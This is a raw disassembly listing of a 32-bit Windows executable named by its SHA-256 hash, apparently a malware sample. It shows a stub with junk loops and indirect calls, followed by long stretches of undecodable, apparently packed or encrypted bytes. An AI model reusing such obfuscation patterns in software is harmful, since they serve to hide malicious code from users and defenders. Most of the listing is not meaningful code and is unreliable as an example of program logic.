
57c61b84182c57c27dc39c10aeec02473509382696ca200add3e51c9e718ea10.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	mov    ecx,0x7059f37e
  4012f8:	jo     0x40136a
  4012fa:	jo     0x40136c
  4012fc:	jle    0x40136e
  4012fe:	jo     0x4012c0
  401300:	xlat   BYTE PTR ds:[ebx]
  401301:	cmp    eax,0xcfd339d5
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	dec    edx
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	mov    gs:0xc0e796bc,al
  4013ad:	outs   dx,BYTE PTR ds:[esi]
  4013ae:	fcom   DWORD PTR [edi+ebx*2+0x2ec6169e]
  4013b5:	sar    BYTE PTR [ebp-0x4e],1
  4013b8:	pop    ebp
  4013b9:	inc    ebp
  4013ba:	or     dl,ch
  4013bc:	into   
  4013bd:	test   al,0x60
  4013bf:	imul   edx,DWORD PTR [edx-0x29],0x58
  4013c3:	ficomp WORD PTR [ebx+0x23]
  4013c6:	sub    eax,0x1e3337dd
  4013cb:	dec    ecx
  4013cc:	xor    BYTE PTR [eax+esi*1+0x7],ch
  4013d0:	cld    
  4013d1:	fadd   DWORD PTR [ecx+0xd63024c]
  4013d7:	mov    ah,0xde
  4013d9:	push   edx
  4013da:	or     bh,BYTE PTR [esi-0x38]
  4013dd:	iret   
  4013de:	jae    0x40143f
  4013e0:	jmp    0x9a61:0x5e7b3e05
  4013e7:	mov    al,0x70
  4013e9:	(bad)  
  4013eb:	fwait
  4013ec:	fs jnp 0x401469
  4013ef:	enter  0x6fc6,0xfe
  4013f3:	pop    edx
  4013f4:	cwde   
  4013f5:	hlt    
  4013f6:	mov    bh,0xe2
  4013f8:	sub    eax,0x822a085f
  4013fd:	scas   eax,DWORD PTR es:[edi]
  4013fe:	dec    esi
  4013ff:	or     ah,BYTE PTR [ebp+0xc10caa]
  401405:	movd   mm4,DWORD PTR [eax+0x11]
  401409:	push   0x2f
  40140b:	push   ss
  40140c:	jne    0x4013c7
  40140e:	mov    eax,0x249f8c42
  401413:	pop    esp
  401414:	jns    0x401441
  401416:	les    edx,FWORD PTR [ecx-0x21969d85]
  40141c:	push   DWORD PTR [eax]
  40141e:	dec    esi
  40141f:	xor    eax,edi
  401421:	jno    0x401429
  401423:	sub    ch,BYTE PTR [edx+0x14]
  401426:	out    dx,eax
  401427:	add    edx,DWORD PTR [ebp-0x17]
  40142a:	xlat   BYTE PTR ds:[ebx]
  40142b:	hlt    
  40142c:	pop    ecx
  40142d:	(bad)  
  40142e:	sbb    eax,0xef4b0cc3
  401433:	ss jb  0x4013d0
  401436:	aam    0x84
  401438:	dec    esi
  401439:	xchg   edx,eax
  40143a:	popa   
  40143b:	mov    ch,0x2d
  40143d:	cs push 0x89f68b94
  401443:	xor    eax,0x6941c243
  401448:	pop    ebp
  401449:	push   ecx
  40144a:	aaa    
  40144b:	cmp    al,0xa9
  40144d:	push   ebx
  40144e:	enter  0x7b98,0x8
  401452:	imul   BYTE PTR [esi+0x76921a71]
  401458:	mov    eax,0x34d438fc
  40145d:	mov    bh,dh
  40145f:	jo     0x4014d9
  401461:	sbb    al,0x85
  401463:	xor    DWORD PTR [esi+0x4239f143],ebx
  401469:	cmp    ax,0x7251
  40146d:	jbe    0x4014d7
  40146f:	fwait
  401470:	outs   dx,DWORD PTR ds:[esi]
  401471:	adc    al,0xbc
  401473:	mov    edx,0x7d25f6dd
  401478:	mov    ch,BYTE PTR [edi]
  40147a:	and    eax,ebp
  40147c:	fsubr  DWORD PTR [ebx]
  40147e:	jl     0x4014d2
  401480:	mov    DWORD PTR [ecx+0x340cbc9a],edx
  401486:	inc    ebx
  401487:	rol    BYTE PTR [ebx+0x177a2337],cl
  40148d:	test   al,0x7e
  40148f:	(bad)  
  401490:	push   ecx
  401491:	push   ebp
  401492:	shl    edx,0x3e
  401495:	addr16 dec eax
  401497:	xchg   ebp,eax
  401498:	inc    esi
  401499:	adc    ch,BYTE PTR [esi+0x46]
  40149c:	mov    edi,esp
  40149e:	std    
  40149f:	call   0x5b0d:0x8a39cce7
  4014a6:	push   edi
  4014a7:	jns    0x401522
  4014a9:	test   al,0xc6
  4014ab:	pop    es
  4014ac:	inc    edi
  4014ad:	jp     0x4014d9
  4014af:	das    
  4014b0:	xor    al,0x17
  4014b2:	jmp    0x4014ec
  4014b4:	fstp   DWORD PTR [edi+0x61]
  4014b7:	addr16 ss mov esi,0x6779a3ac
  4014be:	js     0x401487
  4014c0:	xchg   esi,eax
  4014c1:	das    
  4014c2:	push   es
  4014c3:	lods   eax,DWORD PTR ds:[esi]
  4014c4:	dec    esi
  4014c5:	dec    edx
  4014c6:	in     al,0x0
  4014c8:	sub    eax,DWORD PTR [edi-0x140d6dad]
  4014ce:	loope  0x4014f1
  4014d0:	jb     0xe61f8d84
  4014d6:	sub    al,0x51
  4014d8:	imul   esp,DWORD PTR [eax-0x6a972b2],0x23
  4014df:	pop    ebx
  4014e0:	mov    ds:0xfd13ad0c,al
  4014e5:	xchg   esi,eax
  4014e6:	add    BYTE PTR [ebp+0x72],cl
  4014e9:	push   eax
  4014ea:	add    eax,esi
  4014ec:	pop    ds
  4014ed:	aad    0x60
  4014ef:	fmul   DWORD PTR [edi]
  4014f1:	outs   dx,DWORD PTR gs:[esi]
  4014f3:	outs   dx,DWORD PTR ds:[esi]
  4014f4:	in     eax,0xb0
  4014f6:	jecxz  0x401478
  4014f8:	dec    ebp
  4014f9:	adc    BYTE PTR [ebx+0x4c],ah
  4014fc:	jmp    0x89a67389
  401501:	inc    ebp
  401502:	cld    
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x5be7e013]
  401516:	loopne 0x40158c
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	ins    BYTE PTR es:[edi],dx
  401521:	push   cs
  401522:	jmp    0x401585
  401524:	cs mov bl,0x1
  401527:	xor    edx,eax
  401529:	in     eax,0xc5
  40152b:	scas   al,BYTE PTR es:[edi]
  40152c:	mov    ebp,0x1ee9ef12
  401531:	adc    BYTE PTR [ecx-0x34],dh
  401534:	mov    ebp,0xda2a6962
  401539:	jecxz  0x401535
  40153b:	das    
  40153c:	jecxz  0x40151c
  40153e:	push   ecx
  40153f:	mov    ecx,0x70cfe717
  401544:	push   eax
  401545:	aaa    
  401546:	movq   mm7,QWORD PTR [ebx+0x71]
  40154a:	test   al,0xae
  40154c:	mov    DWORD PTR [ebp-0x39],edi
  40154f:	and    ecx,edi
  401551:	mov    eax,ebx
  401553:	adc    esp,eax
  401555:	inc    esp
  401556:	leave  
  401557:	aam    0xa4
  401559:	(bad)  
  40155a:	ficom  WORD PTR [ebp+0x20]
  40155d:	mov    ebp,0x595b57a2
  401562:	cmp    eax,0x527fa151
  401567:	jp     0x40154e
  401569:	jle    0x40157b
  40156b:	outs   dx,BYTE PTR ss:[esi]
  40156d:	inc    ebx
  40156e:	stc    
  40156f:	jl     0x4015ab
  401571:	lods   al,BYTE PTR gs:[esi]
  401573:	mov    dl,0xee
  401575:	out    dx,eax
  401576:	add    edx,DWORD PTR [esi-0x42]
  401579:	or     ebp,DWORD PTR [edx-0x70]
  40157c:	xchg   BYTE PTR [esp+ecx*1+0x14ecff26],bl
  401583:	or     al,0xf1
  401585:	fwait
  401586:	push   cs
  401587:	(bad)  
  401589:	lahf   
  40158a:	clc    
  40158b:	in     al,dx
  40158c:	push   edx
  40158d:	adc    eax,0xea104dc3
  401592:	mov    al,0x4e
  401594:	xor    bh,bl
  401596:	cmp    DWORD PTR [ecx+ebp*4-0xdb0c796],eax
  40159d:	inc    ebp
  40159e:	jns    0x4015e4
  4015a0:	push   ebx
  4015a1:	adc    BYTE PTR [ebx],bl
  4015a3:	lods   al,BYTE PTR ds:[esi]
  4015a4:	es pop edi
  4015a6:	cmp    dh,BYTE PTR [ecx-0x57]
  4015a9:	xor    eax,0x3b5c6e38
  4015ae:	ficom  DWORD PTR [ecx]
  4015b0:	mov    bl,0x12
  4015b2:	inc    edi
  4015b3:	xor    esp,DWORD PTR [eax+ebx*8-0x92e362b]
  4015ba:	arpl   WORD PTR [edi+ebp*4-0x48],di
  4015be:	jp     0x401582
  4015c0:	out    0xd,al
  4015c2:	xchg   ecx,eax
  4015c3:	add    eax,0x2d5f16c9
  4015c8:	or     cl,bl
  4015ca:	xor    ah,dl
  4015cc:	push   cs
  4015cd:	ror    DWORD PTR [ebx],0xa8
  4015d0:	loop   0x401625
  4015d2:	adc    eax,0x2f969965
  4015d7:	jmp    0xb16215cb
  4015dc:	jb     0x40158f
  4015de:	outs   dx,BYTE PTR ds:[esi]
  4015df:	repz push cs
  4015e1:	pop    edx
  4015e2:	ror    ah,1
  4015e4:	stos   DWORD PTR es:[edi],eax
  4015e5:	add    esp,DWORD PTR [edx]
  4015e7:	mov    dh,0xac
  4015e9:	pusha  
  4015ea:	cli    
  4015eb:	mov    cl,0xee
  4015ed:	jmp    0x4015e4
  4015ef:	sar    BYTE PTR [esp+edi*1+0x50cbcee3],1
  4015f6:	xor    DWORD PTR [eax],ecx
  4015f8:	fcomp  QWORD PTR [ebx]
  4015fa:	cli    
  4015fb:	push   ss
  4015fc:	add    ah,BYTE PTR [edx+edx*4+0x3c1ff4ea]
  401603:	pop    esp
  401604:	lahf   
  401605:	adc    ebp,edi
  401607:	es jle 0x4015b5
  40160a:	jg     0x4015f8
  40160c:	inc    eax
  40160d:	inc    ebx
  40160e:	mov    al,ds:0x3df8632e
  401613:	sti    
  401614:	rol    BYTE PTR [ecx+0x434ce74c],cl
  40161a:	and    al,0xc1
  40161c:	pop    es
  40161d:	push   ss
  40161e:	fnsave [edi-0x12e54240]
  401624:	fsubr  QWORD PTR [esp+ebx*1+0x3d0e977c]
  40162b:	push   es
  40162c:	xor    BYTE PTR [ecx-0x6c25ee84],ah
  401632:	mov    BYTE PTR [edi-0x1b2394de],dh
  401638:	sbb    eax,DWORD PTR [ecx]
  40163a:	mul    cl
  40163c:	pop    edi
  40163d:	mov    ebx,0xc5824f77
  401642:	(bad)  
  401644:	mov    al,0x74
  401646:	mov    eax,ds:0x29dc4c25
  40164b:	lea    ebp,[ebp-0x4e41628a]
  401651:	mov    ds:0xda215eec,al
  401656:	inc    ecx
  401657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401658:	lods   al,BYTE PTR ds:[esi]
  401659:	mov    bh,0x73
  40165b:	push   eax
  40165c:	fwait
  40165d:	inc    eax
  40165e:	pushf  
  40165f:	sbb    BYTE PTR [eax+0x26129c01],ah
  401665:	xchg   ebp,eax
  401666:	and    BYTE PTR [edx+0x39],0x56
  40166a:	adc    BYTE PTR [ecx-0x5a],cl
  40166d:	sbb    bh,0x89
  401670:	loope  0x4016a2
  401672:	jo     0x4016dc
  401674:	enter  0x5a38,0x88
  401678:	pop    ds
  401679:	push   ebx
  40167a:	(bad)  
  40167b:	add    al,0x4b
  40167d:	fcmovnbe st,st(7)
  40167f:	pop    ebx
  401680:	add    BYTE PTR [edi+0x47588703],bl
  401686:	mov    ah,0x81
  401688:	or     esi,esi
  40168a:	inc    edi
  40168b:	dec    ecx
  40168c:	mov    dl,bl
  40168e:	mov    bh,0xa
  401690:	dec    eax
  401691:	popf   
  401692:	ins    DWORD PTR es:[edi],dx
  401693:	loope  0x401654
  401695:	mov    esp,0x7b907ddb
  40169a:	adc    al,0x1d
  40169c:	sbb    bh,BYTE PTR [edx-0x73]
  40169f:	jno    0x4016d2
  4016a1:	inc    esi
  4016a2:	or     DWORD PTR [esi],0xd29b905e
  4016a8:	ins    BYTE PTR es:[edi],dx
  4016a9:	bound  edi,QWORD PTR [ecx-0x44334d73]
  4016af:	mov    al,BYTE PTR [ebp-0xc]
  4016b2:	popf   
  4016b3:	add    BYTE PTR [eax+eiz*2],ch
  4016b6:	int    0x8d
  4016b8:	sbb    bh,BYTE PTR [eax-0x44]
  4016bb:	shr    BYTE PTR [edx+edx*4-0x41],1
  4016bf:	pop    ss
  4016c0:	(bad)  
  4016c1:	jle    0x4016bd
  4016c3:	(bad)  
  4016c4:	sub    eax,0x29954e
  4016c9:	scas   al,BYTE PTR es:[di]
  4016cb:	cmc    
  4016cc:	xlat   BYTE PTR ds:[ebx]
  4016cd:	and    edi,DWORD PTR [eax+0x5905d540]
  4016d3:	shr    BYTE PTR [ebx+0x66],cl
  4016d6:	pop    edi
  4016d7:	jb     0x40168e
  4016d9:	push   edx
  4016da:	div    DWORD PTR [ecx+0x3df6eb6e]
  4016e0:	jl     0x4016b1
  4016e2:	or     esi,esi
  4016e4:	dec    edx
  4016e5:	mov    dh,cl
  4016e7:	xor    dh,BYTE PTR [edx-0x7560c615]
  4016ed:	pop    esp
  4016ee:	mov    edi,DWORD PTR [edi]
  4016f0:	adc    ch,BYTE PTR [ecx+0x54]
  4016f3:	int3   
  4016f4:	fistp  DWORD PTR [ecx+0x2e]
  4016f7:	mov    ds:0x9bec2d5,eax
  4016fc:	jg     0x401705
  4016fe:	arpl   bp,si
  401700:	jp     0x40175e
  401702:	xchg   esi,eax
  401703:	and    esp,DWORD PTR [edx+edx*2-0x497ad107]
  40170a:	fiadd  WORD PTR [edx+0x2e93b5dd]
  401710:	jnp    0x401758
  401712:	rcl    DWORD PTR ds:0x61882521,1
  401718:	repnz in eax,dx
  40171a:	gs mov ebx,edi
  40171d:	push   0xffffffd0
  40171f:	cld    
  401720:	lea    eax,[ebp-0x30]
  401723:	mov    DWORD PTR [ebp-0x34],eax
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	retf   0x403f
  401743:	pop    es
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	pop    ss
  40174d:	push   0x42b578bf
  401752:	xchg   cl,al
  401754:	repnz pushf 
  401756:	mov    esp,0xbdae1a86
  40175b:	pop    eax
  40175c:	add    DWORD PTR [ecx+0x5],ebp
  40175f:	imul   edx,ecx,0x5d
  401762:	js     0x4017b4
  401764:	adc    bh,BYTE PTR [ebp+0x3a422469]
  40176a:	pop    ds
  40176b:	sub    ebx,edi
  40176d:	pop    esi
  40176e:	pop    ss
  40176f:	aas    
  401770:	sbb    DWORD PTR [ecx+0x36],eax
  401773:	inc    eax
  401774:	or     BYTE PTR [ebx+0x341e41b8],bh
  40177a:	dec    eax
  40177b:	push   ebp
  40177c:	inc    esp
  40177d:	jmp    0x4017d4
  40177f:	lahf   
  401780:	jne    0x4017ce
  401782:	rcr    edi,cl
  401784:	sub    eax,0xe676a98d
  401789:	adc    DWORD PTR [eax],0x445d249e
  40178f:	leave  
  401790:	mov    dh,0xe0
  401792:	jl     0x9a34c34
  401798:	pop    ss
  401799:	nop
  40179a:	adc    ebp,DWORD PTR [eax+0x5]
  40179d:	pop    esp
  40179e:	mov    eax,ds:0x358d4229
  4017a3:	cmp    eax,ebx
  4017a5:	lahf   
  4017a6:	mov    ch,BYTE PTR ds:0x6bbd17dd
  4017ac:	test   BYTE PTR ds:0x4a68fe30,al
  4017b2:	dec    esi
  4017b3:	in     al,0xcf
  4017b5:	add    eax,0x3c82041d
  4017ba:	lock outs dx,BYTE PTR ds:[esi]
  4017bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017bd:	rcr    BYTE PTR [ebx+edi*8+0x54],cl
  4017c1:	adc    edx,eax
  4017c3:	jmp    0x40182a
  4017c5:	pop    ebp
  4017c6:	fsub   QWORD PTR [ecx-0x51]
  4017c9:	or     DWORD PTR [esi-0x4a],ebx
  4017cc:	enter  0xa556,0xb1
  4017d0:	pushf  
  4017d1:	cld    
  4017d2:	jnp    0x401762
  4017d4:	or     ecx,DWORD PTR [edx-0x371c15b7]
  4017da:	repz adc eax,0xb0253491
  4017e0:	rcr    BYTE PTR [edx],1
  4017e2:	data16 lods al,BYTE PTR ds:[esi]
  4017e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017e5:	sbb    al,0xba
  4017e7:	mov    DWORD PTR [edi+0x5c5910be],esp
  4017ed:	fmul   st,st(5)
  4017ef:	xlat   BYTE PTR ds:[ebx]
  4017f0:	loop   0x401792
  4017f2:	jb     0x4017f8
  4017f4:	jns    0x40177c
  4017f6:	jnp    0x401864
  4017f8:	hlt    
  4017f9:	dec    ebx
  4017fa:	add    eax,0x96fc9527
  4017ff:	adc    eax,0x8bb8db4f
  401804:	ins    BYTE PTR es:[edi],dx
  401805:	popf   
  401806:	pop    esi
  401807:	inc    BYTE PTR [ebp+0x5e28a381]
  40180d:	arpl   WORD PTR [ebx-0x34],cx
  401810:	in     eax,0x90
  401812:	sub    al,0x99
  401814:	jnp    0x40184d
  401816:	inc    edx
  401817:	inc    esp
  401818:	lods   eax,DWORD PTR ds:[esi]
  401819:	inc    eax
  40181a:	test   eax,0xd79a9f94
  40181f:	sub    DWORD PTR [eax+edi*1],edx
  401822:	adc    DWORD PTR [eax-0x7d9c42d9],ebp
  401828:	jg     0x401833
  40182a:	mov    ebx,0x7350e3e4
  40182f:	inc    eax
  401830:	loop   0x401878
  401832:	je     0x401896
  401834:	adc    al,0x40
  401836:	mov    ds:0x83d7abe4,al
  40183b:	(bad)  
  40183c:	cmc    
  40183d:	mov    bl,0xfc
  40183f:	add    dl,BYTE PTR [ebx-0x38]
  401842:	hlt    
  401843:	or     BYTE PTR [edx],0x8d
  401846:	ret    
  401847:	sbb    edi,DWORD PTR [esi-0x4252a25]
  40184d:	jmp    0x695d52b5
  401852:	push   eax
  401853:	mov    esp,0xf9ebf186
  401858:	xchg   esi,eax
  401859:	retf   0x9b16
  40185c:	inc    ebp
  40185d:	adc    eax,0x17ada957
  401862:	popa   
  401863:	jg     0x40184a
  401865:	pop    esp
  401866:	mov    ds:0x747f266a,eax
  40186b:	les    ebx,FWORD PTR [edi-0x4]
  40186e:	enter  0x8be0,0xf3
  401872:	dec    ebx
  401873:	mov    esi,0x3030d4b3
  401878:	jb     0x4018d7
  40187a:	dec    edi
  40187b:	ds inc edx
  40187d:	int3   
  40187e:	not    ecx
  401880:	bnd jbe 0x401808
  401883:	add    al,0x53
  401885:	out    0x6f,eax
  401887:	out    dx,eax
  401888:	in     eax,dx
  401889:	les    ebp,FWORD PTR [edx-0x6a]
  40188c:	pop    eax
  40188d:	add    BYTE PTR [edx],ah
  40188f:	add    eax,0xb0741abc
  401894:	bound  esi,QWORD PTR [edx+0x1b294363]
  40189a:	cmp    DWORD PTR [ebp-0x47],esi
  40189d:	mov    ecx,DWORD PTR [ebp-0x1a]
  4018a0:	ret    0xd3cf
  4018a3:	inc    eax
  4018a4:	xor    ebx,DWORD PTR [ebx]
  4018a6:	jecxz  0x40187c
  4018a8:	xchg   ecx,eax
  4018a9:	add    BYTE PTR [bx+di-0x1d],0x7e
  4018ae:	(bad)  
  4018af:	push   cs
  4018b0:	xchg   DWORD PTR es:[esi+0x20],edx
  4018b4:	inc    esi
  4018b5:	aam    0x1b
  4018b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018b8:	das    
  4018b9:	outs   dx,DWORD PTR ds:[esi]
  4018ba:	fwait
  4018bb:	js     0x40184f
  4018bd:	out    dx,al
  4018be:	icebp  
  4018bf:	retf   
  4018c0:	xor    eax,0x745f6507
  4018c5:	push   ss
  4018c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018c7:	fwait
  4018c8:	xchg   esi,edi
  4018ca:	and    edx,ecx
  4018cc:	xchg   esi,eax
  4018cd:	adc    DWORD PTR [ecx+0x8dff1ca],eax
  4018d3:	(bad)  
  4018d5:	jp     0x401906
  4018d7:	call   0x1907:0xd289a00d
  4018de:	loope  0x4018b8
  4018e0:	das    
  4018e1:	aad    0xb3
  4018e3:	dec    ebx
  4018e4:	xchg   ebp,eax
  4018e5:	jg     0x4018b7
  4018e7:	xchg   BYTE PTR [edx+0x23af148b],bl
  4018ed:	sahf   
  4018ee:	dec    ebp
  4018ef:	push   es
  4018f0:	(bad)  
  4018f1:	mov    bh,0x98
  4018f3:	mov    cl,0x5d
  4018f5:	scas   al,BYTE PTR es:[edi]
  4018f6:	dec    edi
